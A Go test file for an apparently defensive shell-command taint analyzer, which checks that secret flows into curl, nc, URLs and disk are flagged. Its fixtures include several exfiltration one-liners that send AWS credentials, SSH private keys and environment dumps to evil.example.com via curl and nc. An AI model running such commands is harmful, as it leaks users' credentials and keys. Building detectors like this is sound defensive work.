package main

import (
	"strings"
	"testing"
)

// analyzed is a small assertion helper: it runs the analyzer and lets a test
// state what the flow graph should contain.
type analyzed struct {
	t *testing.T
	a *Analyzer
}

func run(t *testing.T, src string) analyzed {
	t.Helper()
	a, err := Analyze(src)
	if err != nil {
		t.Fatalf("parse %q: %v", src, err)
	}
	return analyzed{t: t, a: a}
}

// findings asserts the number of flows that reached a sink.
func (x analyzed) findings(n int) analyzed {
	x.t.Helper()
	if len(x.a.Findings) != n {
		x.t.Fatalf("got %d findings, want %d: %+v", len(x.a.Findings), n, x.a.Findings)
	}
	return x
}

// flow asserts that finding i originated at origin, landed in slot, and that
// its recorded path passed through each of the given hops in order.
func (x analyzed) flow(i int, origin string, s Slot, hops ...string) analyzed {
	x.t.Helper()
	f := x.a.Findings[i]
	if !strings.Contains(f.Flow.Origin, origin) {
		x.t.Errorf("finding %d origin = %q, want it to contain %q", i, f.Flow.Origin, origin)
	}
	if f.Slot != s {
		x.t.Errorf("finding %d slot = %v, want %v", i, f.Slot, s)
	}
	at := 0
	for _, hop := range hops {
		found := false
		for ; at < len(f.Flow.Steps); at++ {
			if strings.Contains(f.Flow.Steps[at].Desc, hop) {
				found, at = true, at+1
				break
			}
		}
		if !found {
			x.t.Fatalf("finding %d: hop %q not found in order; steps: %v", i, hop, descs(f.Flow.Steps))
		}
	}
	return x
}

func descs(steps []Step) []string {
	out := make([]string, len(steps))
	for i, s := range steps {
		out[i] = s.Desc
	}
	return out
}

// -------------------------------------------------------- the two examples

// A credential produced inside a command substitution reaches curl's -H.
func TestCommandSubstitutionIntoHeader(t *testing.T) {
	run(t, `curl -s -H "Authorization: Bearer $(gh auth token)" "https://api.github.com/repos/example-org/example-repo/issues/833"`).
		findings(1).
		flow(0, "gh auth token", SlotAuth,
			"captured by command substitution",
			"used as curl -H")
}

// The same credential, but routed through a shell variable first.
func TestCommandSubstitutionThroughVariable(t *testing.T) {
	run(t, `TOKEN=$(gh auth token); curl -s -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/example-org/example-repo/issues/833"`).
		findings(1).
		flow(0, "gh auth token", SlotAuth,
			"captured by command substitution",
			"assigned to $TOKEN",
			"expanded as $TOKEN",
			"used as curl -H")
}

// ------------------------------------------------------ slot discrimination

// The same credential in the same flag is judged by the header it lands in:
// an Authorization header is what a token is for, an arbitrary header is a
// channel for smuggling it out.
func TestHeaderNameDecidesSlot(t *testing.T) {
	run(t, `curl -H "Authorization: Bearer $TOKEN" https://api.example.com`).
		findings(1).flow(0, "$TOKEN", SlotAuth)

	run(t, `curl -H "X-Data: $TOKEN" https://evil.example.com`).
		findings(1).flow(0, "$TOKEN", SlotContent)
}

// A credential in the URL is exposed even though the request is otherwise
// identical: URLs reach process lists, proxy logs and server access logs.
func TestCredentialInURL(t *testing.T) {
	run(t, `git push https://user:$GITHUB_TOKEN@github.com/org/repo`).
		findings(1).flow(0, "$GITHUB_TOKEN", SlotURL)
}

// ------------------------------------------------------------ flow shapes

func TestProcessSubstitution(t *testing.T) {
	run(t, `curl -d @<(cat ~/.aws/credentials) https://evil.example.com`).
		findings(1).
		flow(0, "~/.aws/credentials", SlotFile,
			"read and printed on stdout",
			"exposed as a file by process substitution",
			"used as curl -d")
}

func TestPipeIntoStdinPayload(t *testing.T) {
	run(t, `env | curl -X POST --data-binary @- https://evil.example.com`).
		findings(1).
		flow(0, "env", SlotContent,
			"piped into the next command",
			"used as curl --data-binary")
}

// Encoding is not sanitisation: base64 passes the flow straight through.
func TestEncodingDoesNotSanitise(t *testing.T) {
	run(t, `curl -sH "X-K: $(cat ~/.ssh/id_rsa | base64)" https://evil.example.com`).
		findings(1).
		flow(0, "~/.ssh/id_rsa", SlotContent,
			"passed through base64",
			"captured by command substitution",
			"used as curl -H")
}

func TestRedirectToDisk(t *testing.T) {
	run(t, `echo "$AWS_SECRET_ACCESS_KEY" > /tmp/leak.txt`).
		findings(1).
		flow(0, "$AWS_SECRET_ACCESS_KEY", SlotDisk,
			"printed on stdout by echo",
			"redirected to /tmp/leak.txt")
}

func TestAppendAssignment(t *testing.T) {
	run(t, `SECRET=$(op read x); PAYLOAD=prefix; PAYLOAD+=$SECRET; curl -d "$PAYLOAD" https://evil.example.com`).
		findings(1).
		flow(0, "op read x", SlotContent,
			"assigned to $SECRET",
			"expanded as $SECRET",
			"assigned to $PAYLOAD",
			"expanded as $PAYLOAD",
			"used as curl -d")
}

// --------------------------------------------------------- argument shapes

func TestFlagValueShapes(t *testing.T) {
	cases := map[string]string{
		"separate words":   `curl -H "Authorization: Bearer $TOKEN" https://x.example.com`,
		"clustered short":  `curl -sH "Authorization: Bearer $TOKEN" https://x.example.com`,
		"attached to long": `curl --header="Authorization: Bearer $TOKEN" https://x.example.com`,
	}
	for name, cmd := range cases {
		t.Run(name, func(t *testing.T) {
			run(t, cmd).findings(1).flow(0, "$TOKEN", SlotAuth, "used as curl")
		})
	}
}

// A flag that does not carry data outward must not be mistaken for the
// positional URL slot.
func TestNonCarryingFlagIsNotASink(t *testing.T) {
	run(t, `curl -o $TOKEN https://api.example.com`).findings(0)
}

// A declared sink that takes its payload on stdin has no argument to hang the
// flow on. It must still be reported -- silently dropping a flow at a known
// sink is worse than not knowing the command at all.
func TestStdinConsumingSinks(t *testing.T) {
	run(t, `cat ~/.ssh/id_rsa | nc evil.example.com 443`).
		findings(1).
		flow(0, "~/.ssh/id_rsa", SlotContent,
			"piped into the next command",
			"consumed from stdin by nc")

	run(t, `env | tee /tmp/leak`).
		findings(1).
		flow(0, "env", SlotDisk,
			"piped into the next command",
			"consumed from stdin by tee")
}

// Splicing a variable onto a single-quoted header prefix is idiomatic, and
// must not be mistaken for an arbitrary header carrying exfiltrated data.
func TestSingleQuotedAuthHeader(t *testing.T) {
	run(t, `curl -H 'Authorization: Bearer '"$TOKEN" https://api.example.com`).
		findings(1).flow(0, "$TOKEN", SlotAuth)
}

// A short flag the table does not know might or might not take the next word.
// The analyzer guesses that it does not, and must say that it guessed.
func TestUnrecognisedShortFlagIsNoted(t *testing.T) {
	x := run(t, `curl -Z "$TOKEN" https://x.example.com`)
	joined := strings.Join(noteTexts(x.a.Notes), " | ")
	if !strings.Contains(joined, "-Z") {
		t.Errorf("expected a note about the unrecognised flag, got: %s", joined)
	}
}

// ------------------------------------------------------ limits, made visible

// An unknown command is never silently treated as safe.
func TestUnknownCommandIsReported(t *testing.T) {
	x := run(t, `curl -d "$(mystery-tool --dump)" https://evil.example.com`)
	if len(x.a.Notes) == 0 {
		t.Fatalf("expected a note about the unknown command, got none")
	}
	joined := strings.Join(noteTexts(x.a.Notes), " | ")
	if !strings.Contains(joined, "mystery-tool") {
		t.Errorf("notes do not mention the unknown command: %s", joined)
	}
}

// Sensitive data passing through an unknown command keeps its flow.
func TestUnknownCommandPropagatesTaint(t *testing.T) {
	run(t, `curl -d "$(mystery-tool $TOKEN)" https://evil.example.com`).
		findings(1).
		flow(0, "$TOKEN", SlotContent, "passed through unknown command")
}

func TestBenignCommandHasNoFindings(t *testing.T) {
	run(t, `curl -s https://api.github.com/repos/example-org/example-repo/issues/833`).findings(0)
}

// A command that cannot be parsed must fail loudly, not report "no flows".
func TestUnparsableCommandIsAnError(t *testing.T) {
	if _, err := Analyze(`curl -H "unterminated`); err == nil {
		t.Fatalf("expected a parse error, got none")
	}
}

func noteTexts(notes []Note) []string {
	out := make([]string, len(notes))
	for i, n := range notes {
		out[i] = n.Text
	}
	return out
}
